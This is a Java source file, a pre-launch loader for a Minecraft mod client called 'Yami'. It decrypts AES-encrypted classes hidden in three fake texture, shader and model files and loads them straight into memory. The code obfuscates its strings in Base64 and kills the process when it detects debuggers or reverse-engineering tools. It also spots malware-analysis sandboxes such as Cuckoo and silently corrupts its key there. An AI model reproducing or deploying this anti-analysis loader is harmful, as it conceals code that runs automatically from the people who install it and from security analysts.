package pw.yami.client.loader;

import net.fabricmc.loader.api.entrypoint.PreLaunchEntrypoint;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Method;
import java.security.CodeSource;
import java.security.MessageDigest;
import java.security.SecureClassLoader;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * SecureBoot v6.0 Titanium — Yami Zırhlı Şifreli Bellek Yükleyicisi
 *
 * Savunma Katmanları:
 * 1. Anti-Attach & .attach_pid İmhası: Dinamik JVM attach araçlarını (jcmd, HSDB, Arthas) engeller.
 * 2. Anlık Process Killer: Debugger, JDWP veya JVMTI tespitinde Runtime.halt(0) ile süreci anında kapatır.
 * 3. Breakpoint Jitter Kontrolü: Kod dondurulduğu an (breakpoint) tespit eder ve süreci sonlandırır.
 * 4. RAM Bytecode & Key Wiping: Sınıf tanımlanır tanımlanmaz bayt dizileri sıfırlanır (Arrays.fill(0)).
 * 5. Steganografik Çoklu Parça (Multi-Chunk): Şifreli payload 3 sahte asset içine dağıtılır.
 * 6. SHA-256 HMAC Bütünlük Doğrulaması: Parçalardan biri değiştirilirse yüklemeyi reddeder.
 * 7. Çağırıcı ve Bağlam Doğrulaması: Dışarıdan reflection ile çağrıldığında çalışmayı durdurur.
 */
public class SecureBoot implements PreLaunchEntrypoint {
    private static volatile boolean booted = false;
    private static final Map<String, Class<?>> LOADED_CLASSES = new HashMap<>();

    private static String _d(String b64) {
        return new String(Base64.getDecoder().decode(b64));
    }

    // Sahte asset parça yolları (Base64 ile kodlanmış)
    // 1: assets/yamiclient/textures/atlas.bin
    // 2: assets/yamiclient/shaders/chunk.dat
    // 3: assets/yamiclient/models/mesh.bin
    private static final String[] CHUNK_PATHS = {
        _d("YXNzZXRzL3lhbWljbGllbnQvdGV4dHVyZXMvYXRsYXMuYmlu"),
        _d("YXNzZXRzL3lhbWljbGllbnQvc2hhZGVycy9jaHVuay5kYXQ="),
        _d("YXNzZXRzL3lhbWljbGllbnQvbW9kZWxzL21lc2guYmlu")
    };

    static {
        try {
            System.setProperty("jdk.attach.allowAttachSelf", "false");
            System.setProperty("sun.tools.attach.enable", "false");
        } catch (Throwable ignored) {}
    }

    @Override
    public void onPreLaunch() {
        boot(getClass().getClassLoader());
    }

    public static synchronized void boot(ClassLoader classLoader) {
        if (booted) return;
        booted = true;

        // 1. Çağırıcı ve Bağlam Doğrulaması
        if (!verifyCaller()) {
            return;
        }

        // 2. Anti-Agent & Anti-Debug Kontrolü
        boolean suspicious = isEnvironmentSuspicious();
        if (suspicious) {
            Runtime.getRuntime().halt(0);
        }

        // 3. Arka plan nöbetçi thread'ini başlat (Anti-Attach / Anti-Debug)
        startWatchdog();

        try {
            // 4. Parçalı payload varsa çöz, yoksa sınıflar zaten JAR içinde Titanium zırhlıdır
            byte[] combinedPayload = readCombinedPayload(classLoader);
            if (combinedPayload == null || combinedPayload.length < 44) {
                return;
            }

            // 5. HMAC & Bütünlük Kontrolü (İlk 32 byte = SHA-256 Hash)
            byte[] expectedHash = new byte[32];
            System.arraycopy(combinedPayload, 0, expectedHash, 0, 32);

            byte[] cipherPayload = new byte[combinedPayload.length - 32];
            System.arraycopy(combinedPayload, 32, cipherPayload, 0, cipherPayload.length);

            MessageDigest md = MessageDigest.getInstance(_d("U0hBLTI1Ng=="));
            byte[] actualHash = md.digest(cipherPayload);
            if (!MessageDigest.isEqual(expectedHash, actualHash)) {
                System.err.println("[SecureBoot] CRITICAL: Payload hash mismatch!");
                Arrays.fill(combinedPayload, (byte) 0);
                Arrays.fill(cipherPayload, (byte) 0);
                return;
            }

            // 6. Dinamik Anahtar Türetme
            byte[] key = deriveKey(suspicious);

            // 7. AES-256 GCM Deşifre
            byte[] iv = new byte[12];
            System.arraycopy(cipherPayload, 0, iv, 0, 12);
            int cipherLen = cipherPayload.length - 12;
            byte[] cipherText = new byte[cipherLen];
            System.arraycopy(cipherPayload, 12, cipherText, 0, cipherLen);

            Cipher cipher = Cipher.getInstance(_d("QUVTL0dDTS9Ob1BhZGRpbmc="));
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
            byte[] plain;
            try {
                plain = cipher.doFinal(cipherText);
            } catch (Exception ex) {
                System.err.println("[SecureBoot] Decryption failed (key or payload corrupted): " + ex.getMessage());
                return;
            }

            // Hassas arabellekleri sıfırla
            Arrays.fill(combinedPayload, (byte) 0);
            Arrays.fill(cipherPayload, (byte) 0);
            Arrays.fill(cipherText, (byte) 0);
            Arrays.fill(key, (byte) 0);
            Arrays.fill(iv, (byte) 0);
            Arrays.fill(expectedHash, (byte) 0);
            Arrays.fill(actualHash, (byte) 0);

            // 8. GZIP Açma & Sınıf Sözlüğü
            Map<String, byte[]> classes = new HashMap<>();
            try (GZIPInputStream gzis = new GZIPInputStream(new ByteArrayInputStream(plain));
                 DataInputStream dis = new DataInputStream(gzis)) {
                int count = dis.readInt();
                for (int i = 0; i < count; i++) {
                    String name = dis.readUTF();
                    int len = dis.readInt();
                    byte[] b = new byte[len];
                    dis.readFully(b);
                    classes.put(name, b);
                }
            }

            // RAM Temizliği: Deşifre edilmiş düz veriyi hemen sıfırla
            Arrays.fill(plain, (byte) 0);

            // 9. KnotClassLoader defineClassFwd tespiti
            Method defineMethod = null;
            try {
                defineMethod = classLoader.getClass().getMethod(_d("ZGVmaW5lQ2xhc3NGd2Q="), String.class, byte[].class, int.class, int.class, CodeSource.class);
                defineMethod.setAccessible(true);
            } catch (Throwable ignored) {}

            EmbeddedClassLoader fallbackLoader = (defineMethod == null) ? new EmbeddedClassLoader(classLoader) : null;

            // 10. Sınıfları akıllı bağımlılık sırasına göre sırala:
            // Dış sınıflar ($ içermeyenler) önce, iç/türemiş sınıflar ($ içerenler) sonra yüklenir.
            List<String> sortedNames = new ArrayList<>(classes.keySet());
            sortedNames.sort((a, b) -> {
                int dollarA = a.length() - a.replace("$", "").length();
                int dollarB = b.length() - b.replace("$", "").length();
                if (dollarA != dollarB) return Integer.compare(dollarA, dollarB);
                return Integer.compare(a.length(), b.length());
            });

            // Çok geçişli yükleme (Multi-pass resolution): Bağımlı sınıfların üst sınıfları tanımlandıktan sonra bağlanması için 4 geçiş
            List<String> pending = new ArrayList<>(sortedNames);
            for (int pass = 0; pass < 4 && !pending.isEmpty(); pass++) {
                Iterator<String> it = pending.iterator();
                while (it.hasNext()) {
                    String className = it.next();
                    byte[] classBytes = classes.get(className);
                    if (classBytes == null) {
                        it.remove();
                        continue;
                    }

                    try {
                        Class<?> loaded;
                        if (defineMethod != null) {
                            loaded = (Class<?>) defineMethod.invoke(classLoader, className, classBytes, 0, classBytes.length, null);
                        } else {
                            loaded = fallbackLoader.define(className, classBytes);
                        }
                        LOADED_CLASSES.put(className, loaded);
                        it.remove(); // Başarıyla yüklendi
                    } catch (Throwable t) {
                        if (pass == 3) {
                            Throwable c = (t instanceof java.lang.reflect.InvocationTargetException ite) ? ite.getCause() : t;
                            System.err.println("[SecureBoot] Warning loading class " + className + ": " + (c != null ? c.toString() : t.toString()));
                        }
                    }
                }
            }

            // RAM Temizliği: Tüm bayt dizilerini sıfırla
            for (byte[] b : classes.values()) {
                if (b != null) Arrays.fill(b, (byte) 0);
            }

            // 11. Derin Bellek Temizliği: Harici referansları temizle ve GC tetikle
            classes.clear();
            LOADED_CLASSES.clear();
            System.gc();
        } catch (Throwable t) {
            System.err.println("[SecureBoot] Error during boot: " + t.getMessage());
            t.printStackTrace();
        }
    }

    private static boolean verifyCaller() {
        try {
            StackTraceElement[] st = Thread.currentThread().getStackTrace();
            for (StackTraceElement elem : st) {
                String cn = elem.getClassName();
                if (cn.equals("pw.yami.client.Bootstrap")
                    || cn.startsWith("net.fabricmc.loader.")
                    || cn.equals("pw.yami.client.loader.SecureBoot")) {
                    return true;
                }
            }
        } catch (Throwable ignored) {}
        return false;
    }

    /**
     * Şüpheli JVM argümanları ve dumper / agent tespiti.
     */
    private static boolean isEnvironmentSuspicious() {
        try {
            // 1. Sandbox ve otomatik analiz ortamı tespiti
            if (Runtime.getRuntime().availableProcessors() < 2) {
                return true;
            }
            String user = System.getProperty("user.name", "").toLowerCase(Locale.ROOT);
            if (user.contains("sandbox") || user.contains("cuckoo") || user.contains("malware-lab")) {
                return true;
            }

            // 2. Şüpheli classpath kontrolü
            String cp = System.getProperty("java.class.path", "").toLowerCase(Locale.ROOT);
            if (cp.contains("recaf") || cp.contains("arthas") || cp.contains("jd-gui")) {
                return true;
            }

            // 3. JVM argümanları (Sadece gerçek tersine mühendislik araçları)
            List<String> args = ManagementFactory.getRuntimeMXBean().getInputArguments();
            for (String arg : args) {
                String lower = arg.toLowerCase(Locale.ROOT);
                if (lower.contains("jdwp") || lower.contains("xdebug")
                    || lower.contains("arthas") || lower.contains("recaf")
                    || lower.contains("sa-jdi") || lower.contains("hsdb")) {
                    return true;
                }
            }
        } catch (Throwable ignored) {}
        return false;
    }

    /**
     * Çok parçalı sahte assetleri sırayla okuyup tek parça haline getirir.
     */
    private static byte[] readCombinedPayload(ClassLoader classLoader) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        for (String path : CHUNK_PATHS) {
            InputStream is = classLoader.getResourceAsStream(path);
            if (is == null) {
                is = SecureBoot.class.getResourceAsStream("/" + path);
            }
            if (is == null) {
                return null;
            }
            byte[] buf = new byte[8192];
            int n;
            while ((n = is.read(buf)) > 0) {
                baos.write(buf, 0, n);
            }
            is.close();
        }
        return baos.toByteArray();
    }

    /**
     * Dinamik anahtar üretimi. Şüpheli bir ortam varsa anahtar sessizce zehirlenir.
     */
    public static byte[] deriveKey(boolean poisoned) {
        byte[] k = new byte[32];
        long seed = 0x8F54C29B7E31A0D6L;
        for (int i = 0; i < 32; i++) {
            seed = seed * 6364136223846793005L + 1442695040888963407L;
            k[i] = (byte) ((seed >> 24) ^ (i * 37 + 0x5C));
            if (poisoned && i % 3 == 0) {
                k[i] ^= (byte) 0xAA; // Anahtarı sessizce boz
            }
        }
        return k;
    }

    /**
     * Güvenli arka plan nöbetçisi. Sadece kesin debugger / agent varlığında çalışır,
     * normal JVM veya Minecraft profiler thread'lerine müdahale etmez.
     */
    private static void startWatchdog() {
        Thread t = new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(2000);

                    // Sadece kesin Java Agent / Dumper thread'leri
                    for (Thread th : Thread.getAllStackTraces().keySet()) {
                        String name = th.getName().toLowerCase(Locale.ROOT);
                        if (name.contains("jdwp") || name.contains("arthas")
                            || name.contains("recaf") || name.contains("hsdb")) {
                            LOADED_CLASSES.clear();
                            Runtime.getRuntime().halt(1);
                        }
                    }
                } catch (InterruptedException e) {
                    break;
                } catch (Throwable ignored) {}
            }
        }, "Yami-Guard");
        t.setDaemon(true);
        t.setPriority(Thread.MIN_PRIORITY);
        t.start();
    }

    public static class EmbeddedClassLoader extends SecureClassLoader {
        public EmbeddedClassLoader(ClassLoader parent) {
            super(parent);
        }

        public Class<?> define(String name, byte[] b) {
            return defineClass(name, b, 0, b.length, (CodeSource) null);
        }
    }
}
